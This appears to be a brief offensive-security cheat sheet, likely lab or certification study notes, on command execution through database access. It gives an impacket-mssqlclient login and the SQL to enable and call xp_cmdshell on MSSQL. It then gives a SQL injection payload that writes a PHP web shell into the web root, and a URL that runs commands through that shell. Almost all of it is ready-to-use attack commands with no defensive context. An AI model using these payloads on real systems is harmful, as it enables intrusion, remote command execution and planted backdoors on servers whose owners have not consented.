# MSSQL DB Command Execution

signing into mssql db
```bash
impacket-mssqlclient $un:$pw@192.168.50.18 -windows-auth
```

use xp_cmdshell to inject
```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
enable xp_cmdshell
EXECUTE xp_cmdshell 'whoami';
```

this writes a file to the server that can be used for RCE
```text
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

run the shell
```text
http://192.168.0.72/tmp/webshell.php?cmd=id
```